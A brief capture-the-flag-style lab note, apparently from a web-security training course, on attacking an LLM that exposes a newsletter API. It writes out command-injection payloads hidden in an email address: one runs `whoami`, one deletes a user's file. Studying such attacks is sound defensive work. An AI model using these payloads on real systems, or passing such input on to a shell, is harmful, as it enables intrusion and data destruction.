# 02 – OS Command Injection via API

- **Goal:** Delete `morale.txt` from Carlos's home directory.
- **Steps:**
  - LLM exposed Newsletter API → tested with normal email input.
  - Used: `$(whoami)@your-exploit-server` → command executed.
  - Used: `$(rm /home/carlos/morale.txt)@...` → file deleted ✅

- **Key Takeaway:** LLM forwarded unsanitized input to shell via backend API.

